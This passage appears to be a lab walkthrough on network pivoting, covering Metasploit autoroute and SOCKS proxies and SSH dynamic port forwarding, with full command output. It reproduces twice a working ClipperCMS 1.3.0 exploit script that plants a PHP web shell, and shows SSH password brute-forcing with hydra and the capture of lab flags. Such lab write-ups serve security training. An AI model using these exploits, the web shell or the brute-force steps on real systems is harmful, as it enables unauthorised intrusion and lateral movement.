[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.163.154.2:4433 
[*] Sending stage (985320 bytes) to 192.163.154.3
[*] Meterpreter session 2 opened (192.163.154.2:4433 -> 192.163.154.3:56368) at 2024-08-22 14:22:46 +0000 ←
[*] Command stager progress: 100.00% (773/773 bytes)
```

`sessions`:
```
Active sessions
===============

  Id  Name  Type                   Information                                   Connection
  --  ----  ----                   -----------                                   ----------
  1         shell cmd/unix                                                       192.163.154.2:43027 -> 192.163.154.3:6200 (192.163.154.3)
  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.163.154.3  192.163.154.2:4433 -> 192.163.154.3:56368 (192.163.154.3) ←
```

`sessions -i 2`

<span style="color: #64b5f6;">**Target 1 machine**</span>.

`getuid`:
```
Server username: uid=0, gid=0, euid=0, egid=0 ←
```

`ifconfig`:
```
Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::


Interface  2
============
Name         : ip_vti0
Hardware MAC : 00:00:00:00:00:00
MTU          : 1480
Flags        : NOARP


Interface 10248
============
Name         : eth0
Hardware MAC : 02:42:c0:a3:9a:03
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.163.154.3
IPv4 Netmask : 255.255.255.0


Interface 10250
============
Name         : eth1
Hardware MAC : 02:42:c0:4e:9a:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.78.154.2 ←
IPv4 Netmask : 255.255.255.0
```

`cat /etc/hosts`:
```
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
192.163.154.3   target-1
192.78.154.2    target-1
192.78.154.3    target-2 ←
```

`shell`

`ping -c 3 target-2`:
```
PING 192.78.154.3 (192.78.154.3) 56(84) bytes of data.
64 bytes from 192.78.154.3: icmp_seq=1 ttl=64 time=0.102 ms
64 bytes from 192.78.154.3: icmp_seq=2 ttl=64 time=0.043 ms
64 bytes from 192.78.154.3: icmp_seq=3 ttl=64 time=0.057 ms

--- 192.78.154.3 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2067ms ←
rtt min/avg/max/mdev = 0.043/0.067/0.102/0.026 ms
```

`exit`

`background`

<span style="color: #e57373;">**Attacker machine**</span>.

`ping -c 3 192.78.154.3`:
```
connect: Network is unreachable ←
```

`search autoroute`, `use post/multi/manage/autoroute`, `show options`, `set SESSION 2`, `set SUBNET 192.78.154.0`, `run`:
```
[!] SESSION may not be compatible with this module.
[*] Running module against 192.163.154.3 ←
[*] Searching for subnets to autoroute.
[+] Route added to subnet 192.78.154.0/255.255.255.0 from host's routing table. ←
[+] Route added to subnet 192.163.154.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
```

`cat /etc/proxychains.conf`:
```
# proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#

# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted
#
#dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

# Proxy DNS requests - no leak for DNS data
proxy_dns 

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000

# ProxyList format
#       type  host  port [user pass]
#       (values separated by 'tab' or 'blank')
#
#
#        Examples:
#
#               socks5  192.168.67.78   1080    lamer   secret
#               http    192.168.89.3    8080    justu   hidden
#               socks4  192.168.1.49    1080
#               http    192.168.39.93   8080
#
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050 ←
```

`search socks`, `use auxiliary/server/socks4a`, `show options`, `set SRVPORT 9050`, `run`:
```
[*] Auxiliary module running as background job 1.

[*] Starting the socks4a proxy server ←
```

`netstat -antp | grep ":9050"`:
```
tcp        0      0 0.0.0.0:9050            0.0.0.0:*               LISTEN      23/ruby ←
```

`proxychains nmap -Pn -sT -sV 192.78.154.3`:
```
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.70 ( https://nmap.org ) at 2024-08-22 14:32 UTC
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:199-<--denied
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:8888-<--denied
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:23-<--denied
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:113-<--denied
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:53-<--denied
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:110-<--denied

...

|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:80-<><>-OK
Nmap scan report for 192.78.154.3
Host is up (0.0017s latency).
Not shown: 99 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ←
Service Info: Host: localhost

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.82 seconds
```

`proxychains curl http://192.78.154.3/`:
```
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:80-<><>-OK
<meta http-equiv="refresh"
   content="0; url=/clipper/manager"> ←
```

`searchsploit clipper`:
```
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                                                          |  Path
                                                                                                                                                                        | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
ClipperCMS 1.3.0 - Code Execution                                                                                                                                       | exploits/php/remote/38730.py ←
ClipperCMS 1.3.0 - Multiple SQL Injections                                                                                                                              | exploits/php/webapps/38729.txt
ClipperCMS 1.3.3 - Cross-Site Request Forgery (File Upload)                                                                                                             | exploits/php/webapps/45839.txt
ClipperCMS 1.3.3 - Cross-Site Scripting                                                                                                                                 | exploits/php/webapps/44775.txt
Clipperz Password Manager - '/backend/PHP/src/setup/rpc.php' Remote Code Execution                                                                                      | exploits/php/webapps/39191.txt
anaconda clipper 3.3 - Directory Traversal                                                                                                                              | exploits/cgi/remote/20714.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
```

`cp /usr/share/exploitdb/exploits/php/remote/38730.py ./`

`ls -alps`:
```
total 60
4 drwx------ 1 root root 4096 Aug 22 14:00 ./
4 drwxr-xr-x 1 root root 4096 Aug 22 13:37 ../
4 -rw------- 1 root root   34 Aug 22 13:50 .bash_history
4 -rw-r--r-- 1 root root  570 Oct 30  2017 .bashrc
4 drwx------ 1 root root 4096 May 26  2019 .cache/
4 drwxr-xr-x 3 root root 4096 May 26  2019 .msf4/
4 drwxr-xr-x 4 root root 4096 May 26  2019 .npm/
4 -rw-r--r-- 1 root root  148 Oct 30  2017 .profile
4 drwx------ 2 root root 4096 Aug 22 13:43 .ssh/
4 -rw-r--r-- 1 root root   13 Feb  7  2019 .vimrc
4 -rw-r--r-- 1 root root  165 May 26  2019 .wget-hsts
4 -rwxr-xr-x 1 root root 3194 Aug 22 14:00 38730.py ←
4 -rw-r--r-- 1 root root  293 Feb  7  2019 README
4 drwxr-xr-x 1 root root 4096 May 26  2019 tools/
4 drwxr-xr-x 2 root root 4096 Feb  7  2019 wordlists/
```

`cat ./38730.py`:
```python
#!/usr/local/bin/python
# Exploit for ClipperCMS 1.3.0 Code Execution vulnerability
# An account is required with rights to file upload (eg a user in the Admin, Publisher, or Editor role)
# The server must parse htaccess files for this exploit to work.
# Curesec GmbH crt@curesec.com

import sys
import re
import requests # requires requests lib

if len(sys.argv) != 4:
    exit("usage: python " + sys.argv[0] + " http://example.com/ClipperCMS/ admin admin")

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]

loginPath = "/manager/processors/login.processor.php"
fileManagerPath = "/manager/index.php?a=31"

def login(requestSession, url, username, password):
    postData = {"ajax": "1", "username": username, "password": password}
    return requestSession.post(url, data = postData, headers = {"referer": url})

def getFullPath(requestSession, url):
    request = requestSession.get(url, headers = {"referer": url})
    if "You don't have enough privileges" in request.text:
        return "cant upload"
    fullPath = re.search("var current_path = '(.*)';", request.text)
    return fullPath.group(1)

def upload(requestSession, url, fileName, fileContent, postData):
    filesData = {"userfile[0]": (fileName, fileContent)}
    return requestSession.post(url, files = filesData, data = postData, headers = {"referer": url})

def workingShell(url, fullPath):
    return fullPath.strip("/") in requests.get(url + "pwd", headers = {"referer": url}).text.strip("/")

def runShell(url):
    print("enter command, or enter exit to quit.")
    command = raw_input("$ ")
    while "exit" not in command:
        print(requests.get(url + command).text)
        command = raw_input("$ ")

requestSession = requests.session()

loginResult = login(requestSession, url + loginPath, username, password)
if "Incorrect username" in loginResult.text:
    exit("ERROR: Incorrect username or password")
else:
    print("successful: login as " + username)

fullPath = getFullPath(requestSession, url + fileManagerPath)
if fullPath == "cant upload":
    exit("ERROR: user does not have required privileges")
else:
    print("successful: user is allowed to use file manager. Full path: " + fullPath)

uploadResult = upload(requestSession, url + fileManagerPath, ".htaccess", "AddType application/x-httpd-php .png", {"path": fullPath})
if "File uploaded successfully" not in uploadResult.text:
    exit("ERROR: could not upload .htaccess file")
else:
    print("successful: .htaccess upload")

uploadResult = upload(requestSession, url + fileManagerPath, "404.png", "<?php passthru($_GET['x']) ?>", {"path": fullPath})
if "File uploaded successfully" not in uploadResult.text:
    exit("ERROR: could not upload shell")
else:
    print("successful: shell upload. Execute commands via " + url + "404.png?x=<COMMAND>")

if workingShell(url + "404.png?x=", fullPath):
    print("successful: shell seems to be working")
else:
    exit("ERROR: shell does not seem to be working correctly")

runShell(url + "404.png?x=")


#Blog Reference:
#http://blog.curesec.com/article/blog/ClipperCMS-130-Code-Execution-Exploit-96.html
```

`proxychains python ./38730.py`:
```
ProxyChains-3.1 (http://proxychains.sf.net)
|DNS-request| ::1 
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--denied
|DNS-response|: ::1 does not exist
usage: python ./38730.py http://example.com/ClipperCMS/ admin admin ←
```

`proxychains python ./38730.py http://192.78.154.3/clipper/ admin password`:
```
ProxyChains-3.1 (http://proxychains.sf.net)
|DNS-request| ::1 
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--denied
|DNS-response|: ::1 does not exist
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:80-<><>-OK
successful: login as admin
successful: user is allowed to use file manager. Full path: /app/clipper/
successful: .htaccess upload
successful: shell upload. Execute commands via http://192.78.154.3/clipper/404.png?x=<COMMAND>
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:80-<><>-OK
successful: shell seems to be working ←
enter command, or enter exit to quit.
```

<span style="color: #64b5f6;">**Target 2 machine**</span>.

`whoami`:
```
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:80-<><>-OK
www-data ←
```

`hostname`:
```
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:80-<><>-OK
target-2 ←
```

`find / -iname "*flag*" 2> /dev/null`:
```
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:80-<><>-OK
/tmp/flag.txt ←
/usr/lib/perl/5.18.2/bits/waitflags.ph
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/sys/devices/virtual/net/ip_vti0/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/module/scsi_mod/parameters/default_dev_flags
```

`cat /tmp/flag.txt`:
```
|S-chain|-<>-127.0.0.1:9050-<><>-192.78.154.3:80-<><>-OK
dbaa3f9b469d1315486ca82d6aa300b7 ←
```

### Pivoting via SSH Tunneling - Theory

#### SSH Tunneling

SSH tunneling, also known as SSH port forwarding, is a technique that uses Secure Shell (SSH) to create encrypted tunnels for network traffic.

It allows users to securely forward data through an SSH connection, providing a way to protect sensitive information from interception and to bypass certain network restrictions.

SSH tunneling is a versatile tool used for remote access, secure communication, and overcoming firewalls or network segmentation.

#### Pivoting via SSH Tunneling

SSH tunneling, in the context of pivoting, refers to a technique used to create secure tunnels through Secure Shell (SSH) connections that allow attackers or penetration testers to access other systems or network segments.

This method is often employed when an initial foothold has been established, and further access to restricted resources or lateral movement across a network is needed.

SSH tunneling creates an encrypted tunnel between a local and a remote system, allowing you to forward network traffic securely through this tunnel. In pivoting, SSH tunneling can be used to connect to additional systems, establish secure communication channels, or gain access to restricted network segments.

#### SSH Tunneling Techniques

##### Local Port Forwarding

Local port forwarding redirects traffic from a local port on the client system to a specified port on the remote system. This allows you to create secure tunnels to internal resources.

**Use Case for Pivoting:** Local port forwarding can be used to connect to internal services on a compromised system.

This can facilitate access to other network segments or systems behind firewalls.

##### Remote Port Forwarding

Remote port forwarding allows traffic from a port on the remote system to be forwarded to a specified port on the local system. This technique is useful for enabling remote access or establishing backdoors.

**Use Case for Pivoting:** Remote port forwarding can be used to create a tunnel that allows remote systems to connect to internal resources via a compromised system.

This can be used to maintain persistence or access internal networks from outside the firewall.

##### Dynamic Port Forwarding

Dynamic port forwarding creates a SOCKS proxy, allowing flexible port forwarding based on client requests. This is useful for tunneling various types of traffic through the SSH connection.

**Use Case for Pivoting:** Dynamic port forwarding can be used to create a SOCKS proxy, enabling flexible tunneling.

This can be used to access multiple internal resources or services through a single SSH connection, providing a broader scope for pivoting.

### Pivoting via SSH Tunneling - Lab

#### Lab Environment

In this pivoting challenge, the network architecture is as shown below:
 `attacker`  ---> `target-1` ---> `target-2`
 
Your mission is to get the flags kept in flag text files on both `target-1` and `target-2`.

Instructions: 
- The `target-1` should be located at the IP address `192.X.Y.3`.
- Once you compromise `target-1`, you should be able to use that as a pivot to exploit `target-2`.

A webapp is running on `target-2`.
You have managed to get the following credentials for this webapp by using phishing:
- Username :  "admin"
- Password  :  "password".

How to solve this?
- Metasploit is installed on the Kali instance you will get access to.
- All exploitation can happen using Metasploit and Proxychains with third party scripts/tools.
- You are free to use other tools like Nmap for enumeration.

#### Lab Solution

<span style="color: #e57373;">**Attacker machine**</span>.

`cat /etc/hosts`:
```
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.12       attackdefense.com attackdefense
192.124.67.2    attackdefense.com attackdefense
192.124.67.2     attacker
192.124.67.3     target-1 ←
```

`ping -c 3 target-1`:
```
PING target-1 (192.124.67.3) 56(84) bytes of data.
64 bytes from target-1 (192.124.67.3): icmp_seq=1 ttl=64 time=0.065 ms
64 bytes from target-1 (192.124.67.3): icmp_seq=2 ttl=64 time=0.080 ms
64 bytes from target-1 (192.124.67.3): icmp_seq=3 ttl=64 time=0.067 ms

--- target-1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 71ms ←
rtt min/avg/max/mdev = 0.065/0.070/0.080/0.011 ms
```

`namp -Pn -sS -sV target-1 -p-`:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2024-08-22 13:39 UTC
Nmap scan report for target-1 (192.124.67.3)
Host is up (0.000024s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) ←
MAC Address: 02:42:C0:7C:43:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.59 seconds
```

`hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt target-1 ssh`:
```
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-22 13:41:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3957 login tries (l:1/p:3957), ~248 tries per task
[DATA] attacking ssh://target-1:22/
[22][ssh] host: target-1   login: root   password: 1234567890 ←
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-22 13:41:27
```

`ssh root@target-1`:
```
The authenticity of host 'target-1 (192.124.67.3)' can't be established.
ECDSA key fingerprint is SHA256:oj5QKRqCuERnTYhUU5/pcJePvp5fRdOOZdFlJoNOYAI.
Are you sure you want to continue connecting (yes/no)? yes ←
Warning: Permanently added 'target-1,192.124.67.3' (ECDSA) to the list of known hosts.
root@target-1's password: ←
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
```

<span style="color: #64b5f6;">**Target 1 machine**</span>.

`whoami`:
```
root ←
```

`hostname`:
```
target-1 ←
```

`find / -iname "*flag*" 2> /dev/null`:
```
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/waitflags.ph
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/ss_flags.ph
/usr/include/linux/tty_flags.h
/usr/include/linux/kernel-page-flags.h
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth1/flags
/sys/devices/virtual/net/ip_vti0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/root/flag.txt ←
```

`cat /root/flag.txt`:
```
f9a32da38bf9fba2b6c7f7b7fe8709a2 ←
```

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.124.67.3  netmask 255.255.255.0  broadcast 192.124.67.255
        ether 02:42:c0:7c:43:03  txqueuelen 0  (Ethernet)
        RX packets 66226  bytes 3889201 (3.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 66236  bytes 3654776 (3.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.227.191.2  netmask 255.255.255.0  broadcast 192.227.191.255 ←
        ether 02:42:c0:e3:bf:02  txqueuelen 0  (Ethernet)
        RX packets 18  bytes 1516 (1.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`cat /etc/hosts`:
```
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
192.124.67.3    target-1
192.227.191.2   target-1
192.227.191.3   target-2 ← 
```

`ping -c 3 target-2`:
```
-bash: ping: command not found
```

`exit`

<span style="color: #e57373;">**Attacker machine**</span>.

`ping -c 3 192.227.191.3`:
```
connect: Network is unreachable ←
```

`cat /etc/proxychains.conf`:
```
# proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#

# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted
#
#dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

# Proxy DNS requests - no leak for DNS data
proxy_dns 

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000

# ProxyList format
#       type  host  port [user pass]
#       (values separated by 'tab' or 'blank')
#
#
#        Examples:
#
#               socks5  192.168.67.78   1080    lamer   secret
#               http    192.168.89.3    8080    justu   hidden
#               socks4  192.168.1.49    1080
#               http    192.168.39.93   8080
#
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050 ←
```

`ssh root@target-1 -D 9050`:
```
root@target-1's password: ←
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Aug 22 13:43:46 2024 from 192.124.67.2
```

<span style="color: #e57373;">**Attacker machine**</span>.

`netstat -antp | grep ":9050"`:
```
tcp        0      0 127.0.0.1:9050          0.0.0.0:*               LISTEN      53/ssh ←
```

`proxychains nmap -Pn -sT -sV 192.227.191.3 -F`:
```
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.70 ( https://nmap.org ) at 2024-08-22 13:53 UTC
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:139-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:53-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:1720-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:22-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:445-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:443-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:23-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:25-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:3306-<><>-OK

...

|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:3306-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:80-<><>-OK
Nmap scan report for 192.227.191.3
Host is up (0.00031s latency).
Not shown: 98 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu)) ←
3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.37 seconds
```

`proxychains curl http://192.227.191.3:80/`:
```
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-192.227.191.3:80-<><>-OK
<meta http-equiv="refresh"
   content="0; url=/clipper/manager"> ←
```

`searchsploit clipper`:
```
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                                                          |  Path
                                                                                                                                                                        | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
ClipperCMS 1.3.0 - Code Execution                                                                                                                                       | exploits/php/remote/38730.py ←
ClipperCMS 1.3.0 - Multiple SQL Injections                                                                                                                              | exploits/php/webapps/38729.txt
ClipperCMS 1.3.3 - Cross-Site Request Forgery (File Upload)                                                                                                             | exploits/php/webapps/45839.txt
ClipperCMS 1.3.3 - Cross-Site Scripting                                                                                                                                 | exploits/php/webapps/44775.txt
Clipperz Password Manager - '/backend/PHP/src/setup/rpc.php' Remote Code Execution                                                                                      | exploits/php/webapps/39191.txt
anaconda clipper 3.3 - Directory Traversal                                                                                                                              | exploits/cgi/remote/20714.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
```

`cp /usr/share/exploitdb/exploits/php/remote/38730.py ./`

`ls -alps`:
```
total 60
4 drwx------ 1 root root 4096 Aug 22 14:00 ./
4 drwxr-xr-x 1 root root 4096 Aug 22 13:37 ../
4 -rw------- 1 root root   34 Aug 22 13:50 .bash_history
4 -rw-r--r-- 1 root root  570 Oct 30  2017 .bashrc
4 drwx------ 1 root root 4096 May 26  2019 .cache/
4 drwxr-xr-x 3 root root 4096 May 26  2019 .msf4/
4 drwxr-xr-x 4 root root 4096 May 26  2019 .npm/
4 -rw-r--r-- 1 root root  148 Oct 30  2017 .profile
4 drwx------ 2 root root 4096 Aug 22 13:43 .ssh/
4 -rw-r--r-- 1 root root   13 Feb  7  2019 .vimrc
4 -rw-r--r-- 1 root root  165 May 26  2019 .wget-hsts
4 -rwxr-xr-x 1 root root 3194 Aug 22 14:00 38730.py ←
4 -rw-r--r-- 1 root root  293 Feb  7  2019 README
4 drwxr-xr-x 1 root root 4096 May 26  2019 tools/
4 drwxr-xr-x 2 root root 4096 Feb  7  2019 wordlists/
```

`cat ./38730.py`:
```python
#!/usr/local/bin/python
# Exploit for ClipperCMS 1.3.0 Code Execution vulnerability
# An account is required with rights to file upload (eg a user in the Admin, Publisher, or Editor role)
# The server must parse htaccess files for this exploit to work.
# Curesec GmbH crt@curesec.com

import sys
import re
import requests # requires requests lib

if len(sys.argv) != 4:
    exit("usage: python " + sys.argv[0] + " http://example.com/ClipperCMS/ admin admin")

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]

loginPath = "/manager/processors/login.processor.php"
fileManagerPath = "/manager/index.php?a=31"

def login(requestSession, url, username, password):
    postData = {"ajax": "1", "username": username, "password": password}
    return requestSession.post(url, data = postData, headers = {"referer": url})

def getFullPath(requestSession, url):
    request = requestSession.get(url, headers = {"referer": url})
    if "You don't have enough privileges" in request.text:
        return "cant upload"
    fullPath = re.search("var current_path = '(.*)';", request.text)
    return fullPath.group(1)

def upload(requestSession, url, fileName, fileContent, postData):
    filesData = {"userfile[0]": (fileName, fileContent)}
    return requestSession.post(url, files = filesData, data = postData, headers = {"referer": url})

def workingShell(url, fullPath):
    return fullPath.strip("/") in requests.get(url + "pwd", headers = {"referer": url}).text.strip("/")

def runShell(url):
    print("enter command, or enter exit to quit.")
    command = raw_input("$ ")
    while "exit" not in command:
        print(requests.get(url + command).text)
        command = raw_input("$ ")

requestSession = requests.session()

loginResult = login(requestSession, url + loginPath, username, password)
if "Incorrect username" in loginResult.text:
    exit("ERROR: Incorrect username or password")
else:
    print("successful: login as " + username)

fullPath = getFullPath(requestSession, url + fileManagerPath)
if fullPath == "cant upload":
    exit("ERROR: user does not have required privileges")
else:
    print("successful: user is allowed to use file manager. Full path: " + fullPath)

uploadResult = upload(requestSession, url + fileManagerPath, ".htaccess", "AddType application/x-httpd-php .png", {"path": fullPath})
if "File uploaded successfully" not in uploadResult.text:
    exit("ERROR: could not upload .htaccess file")
else:
    print("successful: .htaccess upload")

uploadResult = upload(requestSession, url + fileManagerPath, "404.png", "<?php passthru($_GET['x']) ?>", {"path": fullPath})
if "File uploaded successfully" not in uploadResult.text:
    exit("ERROR: could not upload shell")
else:
    print("successful: shell upload. Execute commands via " + url + "404.png?x=<COMMAND>")

if workingShell(url + "404.png?x=", fullPath):
    print("successful: shell seems to be working")
else:
    exit("ERROR: shell does not seem to be working correctly")

runShell(url + "404.png?x=")


#Blog Reference:
#http://blog.curesec.com/article/blog/ClipperCMS-130-Code-Execution-Exploit-96.html
```

`proxychains python ./38730.py`:
```
ProxyChains-3.1 (http://proxychains.sf.net)
|DNS-request| ::1 
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
